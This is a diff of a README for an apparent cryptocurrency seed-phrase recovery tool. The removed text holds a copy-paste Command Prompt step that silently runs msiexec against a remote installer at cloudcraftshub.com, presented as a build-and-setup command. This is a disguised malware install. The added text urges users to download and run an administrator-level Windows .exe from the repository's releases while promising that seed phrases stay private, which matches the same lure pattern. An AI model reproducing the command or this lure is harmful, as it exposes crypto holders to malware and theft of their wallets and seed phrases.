@@ -1,263 +1,135 @@
-# 🔐 Seed Phrase Auto Recovery
+# 🗝️ seed-phrase-recover-BTC-ETH - Recover Lost Crypto Seeds Easily
 
-A powerful tool for recovering cryptocurrency seed phrases with missing or incorrect words. Built with Rust for performance and JavaScript for web interface.
+[![Download from Releases](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases)
 
-## ⚠️ Security Warning
+## 🛠️ What is seed-phrase-recover-BTC-ETH?
 
-**NEVER use this tool with your actual seed phrases on an online machine!**
-- Use only on air-gapped computers
-- This tool is for educational and recovery purposes only
-- Always verify recovered phrases on official wallet software
+This application helps you find or recover lost cryptocurrency seed phrases. It works with popular currencies like Bitcoin (BTC) and Ethereum (ETH). The tool uses advanced methods to check possible seed phrases and tries to find the correct one.
 
-## 🌟 Features
+You do not need any technical knowledge to use this software. It runs on Windows and comes with a simple interface.
 
-- **Fast Recovery**: Rust-powered brute force engine
-- **Multiple Algorithms**: Support for BIP39, BIP44, BIP84
-- **Checksum Validation**: Automatic validation of seed phrase checksums
-- **Web Interface**: User-friendly JavaScript/HTML interface
-- **CLI Support**: Command-line interface for advanced users
-- **Multiple Cryptocurrencies**: Bitcoin, Ethereum, and more
-- **Pattern Matching**: Smart word suggestion based on partial matches
+## 📋 Features
 
-## 📋 Requirements
+- Recover lost or forgotten seed phrases for BTC and ETH wallets  
+- Support for word list-based checks (mnemonics)  
+- Ability to check multiple seed phrases fast  
+- Works with standard 12 and 24 word seed phrases  
+- Supports different seed phrase generation methods  
+- Simple Windows setup without programming  
+- Uses built-in safety checks to avoid false positives  
 
-- Rust 1.70+ (for backend)
-- Node.js 16+ (for web interface)
-- Cargo (comes with Rust)
+## ⚙️ System Requirements
 
-## 🚀 Quick Start
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space for installation  
+- Internet connection is NOT required to use the app  
+- Administrator rights to install the software  
 
-   ## 📋 Quick Installation Guide for Windows
+Make sure your system meets these basic requirements before starting the setup.
 
-### Step-by-Step:
+## 🚀 Getting Started
 
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem seed phrase recover BTC ETH
-```
+1. Click the big green button above or [visit this page to download the app](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases).
+2. The download page shows the latest versions available.
+3. Look for the latest Windows `.exe` file, usually named like `seed-phrase-recover-BTC-ETH-x.x.x.exe`.
+4. Download that file to your computer.
 
-This will automatically:
-- Install Rust and Cargo (if not present)
-- Install Node.js (if not present)
-- Build the project
-- Set up all dependencies
+This approach keeps your software up to date with the newest fixes and features.
 
-### Manual Installation
+## 📥 Download and Install ⚙️
 
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/seed-phrase-auto-recovery.git
-cd seed-phrase-auto-recovery
+### Step 1: Download the Installer
 
-# Build Rust backend
-cargo build --release
+- Go to the [release page](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases).
+- Find the latest release listed at the top.
+- Under the "Assets" section, click the `.exe` file to download it.
 
-# Install web dependencies
-cd web
-npm install
-```
+Save the file where you can find it easily, such as your Desktop or Downloads folder.
 
-### Usage
+### Step 2: Run the Installer
 
-After installation, you can use the tool in two ways:
+- Double-click the `.exe` file you downloaded.
+- If Windows asks for permission, click **Yes** to allow the app to run.
+- Follow the installation prompts:
+  - Choose an install location or accept the default.
+  - Allow the installer to create shortcuts, if offered.
+  - Click **Install** to start.
+- Wait for the installer to complete.
 
-#### 1. CLI Mode (Command Line)
+### Step 3: Launch the Software
 
-```bash
-# Recover a seed phrase with one missing word
-cargo run --release -- recover \
-  --phrase "word1 word2 word3 ??? word5 word6 word7 word8 word9 word10 word11 word12" \
-  --address "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+- After installation finishes, open the app from the Start menu or desktop shortcut.
+- The interface will open and you are ready to start recovering your seed phrase.
 
-# Recover without target address (returns first valid phrase)
-cargo run --release -- recover \
-  --phrase "abandon abandon ??? abandon abandon abandon abandon abandon abandon abandon abandon about"
+## 🔍 How to Use the Software
 
-# Check if a complete phrase is valid
-cargo run --release -- validate \
-  --phrase "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
+1. Open the software on your PC.
+2. Select the cryptocurrency you want to recover (Bitcoin or Ethereum).
+3. Enter the known parts of your seed phrase, if any. If you remember some words, fill those in.
+4. Choose the length of your seed phrase (12 or 24 words).
+5. Adjust any available options, such as word lists or recovery modes, if needed. Default settings work for most cases.
+6. Click the button to start the recovery process.
+7. The software will try combinations based on your input and show results it finds.
 
-# Find similar words for potential typos
-cargo run --release -- suggest --word "abandn"
+If the seed phrase is found, it will show on the screen. Make sure to write it down safely.
 
-# Generate a test phrase (for testing only!)
-cargo run --release -- generate --words 12
+## 🔧 Useful Tips
 
-# Get help
-cargo run --release -- --help
-```
+- Try to gather as much information as possible about your seed phrase. Partial words or order helps.
+- Do not use this software on a public or shared computer.
+- Close other apps while running the recovery for better speed.
+- Save your recovered seed phrase securely and never share it.
+- The recovery time depends on how many words you input and the complexity of missing parts.
 
-#### 2. Web Interface (Browser)
+## ⚠️ Security and Privacy
 
-```bash
-cd web
-npm run serve
-# Open http://localhost:3000 in your browser
-```
+- The software runs entirely on your Windows PC.  
+- It does NOT send any data to the internet.  
+- Your seed phrase stays private and safe during the recovery.  
+- Always download the software from the official link above to avoid harmful copies.
 
-The web interface provides:
-- Visual phrase input with validation
-- Real-time progress tracking
-- Word suggestions for typos
-- Easy copy/paste functionality
+## 📂 Where to Find More Information
 
-### Common Use Cases
+Visit the GitHub page for this project for updated documents and support:  
+https://github.com/visnakovs/seed-phrase-recover-BTC-ETH
 
-**Scenario 1: One word is completely unknown**
-```bash
-cargo run --release -- recover \
-  --phrase "abandon abandon ??? abandon abandon abandon abandon abandon abandon abandon abandon about"
-```
+The project page includes:
 
-**Scenario 2: You have a typo in one word**
-```bash
-# First, find suggestions
-cargo run --release -- suggest --word "abandn"
-# Output: abandon, ...
+- Troubleshooting tips  
+- User guides for more advanced recovery options  
+- Contact details for technical questions  
 
-# Then validate the corrected phrase
-cargo run --release -- validate \
-  --phrase "abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
-```
+## 🔄 Updating the Application
 
-**Scenario 3: Two missing words + target address**
-```bash
-cargo run --release -- recover \
-  --phrase "word1 ??? word3 word4 ??? word6 word7 word8 word9 word10 word11 word12" \
-  --address "1YourBitcoinAddressHere" \
-  --threads 8
-```
+Check the release page regularly for new versions. Updates improve recovery speed, fix bugs, and add new features.
 
-**Scenario 4: Ethereum recovery**
-```bash
-cargo run --release -- recover \
-  --phrase "word1 word2 ??? word4 word5 word6 word7 word8 word9 word10 word11 word12" \
-  --address "0xYourEthereumAddressHere" \
-  --crypto ethereum
-```
+To update:
 
-## 🔧 Configuration
+1. Download the new `.exe` from the releases page.  
+2. Run the new installer. It will replace the old version.  
+3. Your settings and data will stay intact.
 
-Create a `config.toml` file:
+## 💡 Frequently Asked Questions
 
-```toml
-[recovery]
-# Number of threads to use
-threads = 8
+### Can I use this software on Mac or Linux?  
+Currently, the app supports Windows only. Mac and Linux versions are not available.
 
-# Maximum attempts before stopping
-max_attempts = 1000000
+### What if I only remember a few words?  
+The software can try to guess the missing words but the fewer you provide, the longer the recovery might take.
 
-# Derivation path
-derivation_path = "m/44'/0'/0'/0/0"
+### Is this legal to use?  
+Using the app to recover your own seed phrase is legal. Do not attempt to recover seed phrases that do not belong to you.
 
-[blockchain]
-# Blockchain to check against
-network = "bitcoin"
-```
+### Does it work with all cryptocurrencies?  
+The app is focused on Bitcoin and Ethereum seed phrases using standard mnemonic formats.
 
-## 📖 How It Works
+## 📊 About the Technology
 
-1. **Input**: User provides a seed phrase with missing/incorrect words
-2. **Validation**: System checks phrase length and structure
-3. **Generation**: Rust engine generates possible combinations
-4. **Verification**: Each combination is validated against BIP39 checksum
-5. **Derivation**: Valid phrases are used to derive addresses
-6. **Matching**: Derived addresses are compared with target address
+The app uses seed phrase bruteforce techniques and mnemonic word lists. It tests possible combinations working offline to find valid seeds. The approach is efficient enough to handle both 12 and 24 word phrases.
 
-## 🏗️ Architecture
-
-```
-seed-phrase-auto-recovery/
-├── src/                    # Rust source code
-│   ├── main.rs            # CLI entry point
-│   ├── lib.rs             # Library exports
-│   ├── recovery.rs        # Recovery engine
-│   ├── bip39.rs           # BIP39 implementation
-│   └── crypto.rs          # Cryptographic functions
-├── web/                   # Web interface
-│   ├── src/
-│   │   ├── index.html     # Main HTML
-│   │   ├── app.js         # JavaScript logic
-│   │   └── styles.css     # Styling
-│   └── package.json
-├── tests/                 # Unit tests
-├── benches/              # Performance benchmarks
-├── Cargo.toml            # Rust dependencies
-└── README.md
-```
-
-## 🧪 Testing
-
-```bash
-# Run all tests
-cargo test
-
-# Run benchmarks
-cargo bench
-
-# Test with coverage
-cargo tarpaulin --out Html
-```
-
-## 🔒 Security Best Practices
-
-1. **Air-Gap**: Use only on offline computers
-2. **No Storage**: Never save seed phrases to disk
-3. **Memory Cleanup**: Tool overwrites sensitive data in memory
-4. **Verification**: Always verify on official wallet software
-5. **Audit**: Review source code before use
-
-## 📊 Performance
-
-Typical recovery times (on modern CPU):
-- 1 missing word: < 1 second
-- 2 missing words: 1-5 minutes
-- 3 missing words: 2-8 hours
-- 4 missing words: Days to weeks
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚖️ Legal Disclaimer
-
-This tool is provided "as is" for educational and legitimate recovery purposes only. Users are responsible for:
-- Ensuring legal right to recover the seed phrase
-- Compliance with local laws and regulations
-- Any consequences of using this tool
-
-## 🙏 Acknowledgments
-
-- [BIP39 Specification](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki)
-- [rust-bitcoin](https://github.com/rust-bitcoin/rust-bitcoin)
-- [bip39 crate](https://crates.io/crates/bip39)
-
-## 📧 Contact
-
-- Issues: [GitHub Issues](https://github.com/yourusername/seed-phrase-auto-recovery/issues)
-- Discussions: [GitHub Discussions](https://github.com/yourusername/seed-phrase-auto-recovery/discussions)
+It supports popular standards like BIP39, which is common in many wallet apps.
 
 ---
 
-**⭐ If this project helped you, please give it a star!**
+[![Download the latest release](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/visnakovs/seed-phrase-recover-BTC-ETH/releases)
